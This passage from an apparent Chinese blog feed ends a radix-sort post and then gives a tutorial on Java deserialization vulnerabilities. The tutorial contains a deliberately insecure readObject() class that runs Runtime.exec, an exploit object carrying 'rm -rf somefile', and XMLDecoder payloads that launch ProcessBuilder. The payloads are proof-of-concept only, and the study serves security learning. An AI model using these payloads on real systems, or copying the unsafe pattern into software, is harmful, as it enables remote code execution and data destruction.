punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 获取数组的最大元素，用于判断最大位数</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MIN_VALUE</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num <span class="token operator">:</span> nums<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&gt;</span> m<span class="token punctuation">)</span>            m <span class="token operator">=</span> num<span class="token punctuation">;</span>    <span class="token comment">// 按照从低位到高位的顺序遍历</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> exp <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> exp <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> exp <span class="token operator">*=</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">// 对数组元素的第 k 位执行计数排序</span>        <span class="token comment">// k = 1 -&gt; exp = 1</span>        <span class="token comment">// k = 2 -&gt; exp = 10</span>        <span class="token comment">// 即 exp = 10^(k-1)</span>        <span class="token function">countingSortDigit</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> exp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../image/image-20240321133211778.png" alt="image-20240321133211778"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]: <a href="https://www.hello-algo.com/chapter_sorting/">https://www.hello-algo.com/chapter_sorting/</a>“Hello 算法 第 11 章   排序”</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化漏洞学习</title>
      <link href="/2024/03/13/java-fan-xu-lie-hua-lou-dong-xue-xi/"/>
      <url>/2024/03/13/java-fan-xu-lie-hua-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><h3 id="1-1-什么是序列化"><a href="#1-1-什么是序列化" class="headerlink" title="1.1 什么是序列化"></a>1.1 什么是序列化</h3><p>序列化：是将java对象转换成字节流的过程</p><p>反序列化：是将字节流转换成java对象的过程</p><p><strong>Java中的API实现:</strong></p><p><strong>位置: Java.io.ObjectOutputStream  java.io.ObjectlnputStream</strong></p><p><strong>序列化：ObjectOutputStream类–&gt;writeObject（）</strong></p><p><strong>反序列化：ObjectInoutStream类–&gt;readObject（）</strong></p><p>序列化和反序列化的目的是为了更方便进行数据和对象的存储、网络传输，，流程如下图所示</p><p><img src="/../image/image-20240309174419070.png" alt="image-20240309174419070"></p><p>如今，用于序列化数据的最流行的数据格式是JSON。在此之前，它是XML。</p><p>许多编程语言提供了序列化对象的本机功能。这些原生格式通常提供比JSON或XML更多的功能，包括序列化过程的可定制性。不幸的是，当对不受信任的数据进行操作时，这些本机反序列化机制的功能可能会被重新用于恶意影响。已经发现针对反序列化程序的攻击允许拒绝服务、访问控制和远程代码执行攻击。</p><h3 id="1-2-为什么要序列化"><a href="#1-2-为什么要序列化" class="headerlink" title="1.2 为什么要序列化"></a>1.2 为什么要序列化</h3><ul><li>内存中存在大量的对象，会让内存负担过重，就像常见的session对象，如果有数以万计的用户并发去访问，那就会同样出现数以万计的session对象，这时Web应用会将一些session先序列化存储在硬盘中，等需要使用的时候，再将其反序列化，还原到内存中，节约计算机内存资源。</li><li>在进行远程过程调用时，，现需要在网络上传输JavaBean对象，而网络上只允许二进制形式的数据进行传输，这时则需要用到序列化技术。</li></ul><h3 id="1-3-简单的利用"><a href="#1-3-简单的利用" class="headerlink" title="1.3 简单的利用"></a>1.3 简单的利用</h3><h4 id="1-3-1-一般反序列化"><a href="#1-3-1-一般反序列化" class="headerlink" title="1.3.1 一般反序列化"></a>1.3.1 一般反序列化</h4><p>下面是一个Java反序列化漏洞示例。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">InputStream</span> is <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AcmeObject</span> acme <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">AcmeObject</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>它需要一个AcmeObject对象，但它将在强制转换发生之前执行readObject（）。如果攻击者在readObject（）中找到了实现危险操作的正确类，他可能会序列化该对象，并迫使易受攻击的应用程序执行这些操作。</p><p>攻击者需要在类路径中找到一个支持序列化并且在readObject（）上具有危险实现的类。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>dummy<span class="token punctuation">.</span>insecure<span class="token punctuation">.</span>framework</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">LocalDateTime</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AcmeObject</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">String</span> taskName<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">String</span> taskAction<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">LocalDateTime</span> requestedExecutionTime<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">AcmeObject</span><span class="token punctuation">(</span><span class="token class-name">String</span> taskName<span class="token punctuation">,</span> <span class="token class-name">String</span> taskAction<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>taskName <span class="token operator">=</span> taskName<span class="token punctuation">;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>taskAction <span class="token operator">=</span> taskAction<span class="token punctuation">;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>requestedExecutionTime <span class="token operator">=</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span> <span class="token class-name">ObjectInputStream</span> stream <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token comment">//deserialize data so taskName and taskAction are available</span>                stream<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//blindly run some code. #code injection</span>                <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>taskAction<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果上面显示的java类存在，攻击者可以序列化该对象并获得远程代码执行。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">AcmeObject</span> go <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AcmeObject</span><span class="token punctuation">(</span><span class="token string">"delete all"</span><span class="token punctuation">,</span> <span class="token string">"rm -rf somefile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bos<span class="token punctuation">)</span><span class="token punctuation">;</span>oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>go<span class="token punctuation">)</span><span class="token punctuation">;</span>oos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> exploit <span class="token operator">=</span> bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-3-2-XML反序列化"><a href="#1-3-2-XML反序列化" class="headerlink" title="1.3.2 XML反序列化"></a>1.3.2 XML反序列化</h4><p><strong>XMLEncoder 序列化</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span><span class="token class-name">XMLEncoder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> encoder<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Name"</span><span class="token punctuation">,</span> <span class="token string">"Rookie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"LV"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> arrayList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        arrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Sword"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        arrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Shield"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Equipment"</span><span class="token punctuation">,</span> arrayList<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map = "</span> <span class="token operator">+</span> map<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">XMLEncoder</span> xmlEncoder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLEncoder</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>        xmlEncoder<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>        xmlEncoder<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到结果如下</p><p><img src="/../image/image-20240314194814541.png" alt="image-20240314194814541"></p><p>XML序列化后的内容指定了反序列化的类，指定了序列化了什么对象以及这个对象用了什么方法。</p><p><strong>XMLDecoder 反序列化</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span><span class="token class-name">XMLDecoder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InterruptedIOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">StringBufferInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> decoder <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedIOException</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""            &lt;?xml version="1.0" encoding="UTF-8"?&gt;            &lt;java version="11.0.20" class="java.beans.XMLDecoder"&gt;             &lt;object class="java.util.HashMap"&gt;              &lt;void method="put"&gt;               &lt;string&gt;Equipment&lt;/string&gt;               &lt;object class="java.util.ArrayList"&gt;                &lt;void method="add"&gt;                 &lt;string&gt;Sword&lt;/string&gt;                &lt;/void&gt;                &lt;void method="add"&gt;                 &lt;string&gt;Shield&lt;/string&gt;                &lt;/void&gt;               &lt;/object&gt;              &lt;/void&gt;              &lt;void method="put"&gt;               &lt;string&gt;LV&lt;/string&gt;               &lt;int&gt;1&lt;/int&gt;              &lt;/void&gt;              &lt;void method="put"&gt;               &lt;string&gt;Name&lt;/string&gt;               &lt;string&gt;Rookie&lt;/string&gt;              &lt;/void&gt;             &lt;/object&gt;            &lt;/java&gt;            """</span><span class="token punctuation">;</span>        <span class="token class-name">StringBufferInputStream</span> stringBufferInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBufferInputStream</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">XMLDecoder</span> xmlDecoder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLDecoder</span><span class="token punctuation">(</span>stringBufferInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> xmlDecoder<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下</p><p><img src="/../image/image-20240314200410353.png" alt="image-20240314200410353"></p><p>如果Java应用<strong>对用户输入没有过滤</strong>，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化<strong>产生非预期对象</strong>，非预期的对象在产生过程中就有可能带来<strong>任意代码执行</strong></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>17.0.8<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>calc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将这个XML替换上面的XML，执行结果如下</p><p><img src="/../image/image-20240314203101901.png" alt="image-20240314203101901"></p><h2 id="二、Java系统命令执行"><a href="#二、Java系统命令执行" class="headerlink" title="二、Java系统命令执行"></a>二、Java系统命令执行</h2><p>要想通过反序列化漏洞扩大影响，要了解Java命令执行的内容</p><h3 id="2-1-两个关键的类"><a href="#2-1-两个关键的类" class="headerlink" title="2.1 两个关键的类"></a>2.1 两个关键的类</h3><h4 id="2-1-1-java-lang-Runtime"><a href="#2-1-1-java-lang-Runtime" class="headerlink" title="2.1.1 java.lang.Runtime"></a>2.1.1 java.lang.Runtime</h4><p>Runtime类封装了运行时的环境。每个 Java 应用程序都有一个 Runtime 类实例，使应用程序能够与其运行的环境相连接。</p><p>一般不能实例化一个Runtime对象，应用程序也不能创建自己的 Runtime 类实例，但可以通过 getRuntime 方法获取当前Runtime运行时对象的引用。</p><p>一旦得到了一个当前的Runtime对象的引用，就可以调用Runtime对象的方法去控制Java虚拟机的状态和行为。</p><p>一般写法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//弹出计算器</span><span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Process</span> start <span class="token operator">=</span> runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//生成回显，比如运行ipconfig就需要</span><span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> start<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-1-2-java-lang-ProcessBuilder"><a href="#2-1-2-java-lang-ProcessBuilder" class="headerlink" title="2.1.2 java.lang.ProcessBuilder"></a>2.1.2 java.lang.ProcessBuilder</h4><p> ProcessBuilder类是J2SE 1.5在java.lang中新添加的一个新类，此类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法。在J2SE 1.5之前，都是由Process类处来实现进程的控制管理。每个 ProcessBuilder 实例管理一个进程属性集。它的start() 方法利用这些属性创建一个新的 Process 实例。start() 方法可以从同一实例重复调用，以利用相同的或相关的属性创建新的子进程。</p><p>一般写法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ProcessBuilder</span> processBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Process</span> start <span class="token operator">=</span> processBuilder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> start<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、反序列化payload构造"><a href="#三、反序列化payload构造" class="headerlink" title="三、反序列化payload构造"></a>三、反序列化payload构造</h2><p>XML单参数Payload构造</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>17.0.8<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>calc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" 